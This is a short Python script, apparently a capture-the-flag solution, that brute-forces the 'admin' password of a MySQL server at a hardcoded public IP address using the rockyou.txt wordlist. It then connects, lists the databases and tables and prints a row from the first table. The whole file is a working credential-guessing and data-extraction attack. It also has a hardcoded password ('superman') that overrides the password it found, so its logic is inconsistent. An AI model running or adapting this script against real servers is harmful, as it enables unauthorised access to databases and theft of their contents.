import requests
import mysql.connector

def getFlag(host,user,pas):
    mydb = mysql.connector.connect(host=host,user=user,password=pas)
    mycursor = mydb.cursor()
    mycursor.execute("show databases")
    # result
    databases = []
    for i in mycursor:
        databases.append(i[0])
    mydb.close()

    mydb = mysql.connector.connect(host=host,user=user,password="superman",database=databases[1])
    mycursor = mydb.cursor()
    mycursor.execute("show tables")
    tables = []

    for i in mycursor:
        tables.append(i[0])

    mycursor.execute(f"SELECT * FROM {tables[0]}")
    result = mycursor.fetchone()
    print(result)

    
host = "103.145.226.170"
user = "admin"

files = open("rockyou.txt",encoding="utf-8")
pasDB = ""
for i in files.readlines():
    pas = "".join(i.replace("\n",""))
    try:
        mydb = mysql.connector.connect(host=host,user=user,password=pas)
        mydb.close()
        pasDB += pas
        break
    except Exception as e: 
        print("[-] Not found : "+ pas)

getFlag(host,user,pasDB)

#  can use fetchone or fetchall for get data in database
# mydb = mysql.connector.connect(host=host,user=user,password="superman")
# myCursor = mydb.cursor()
# myCursor.execute("show databases")
# result = list(myCursor.fetchone())
# print(result)
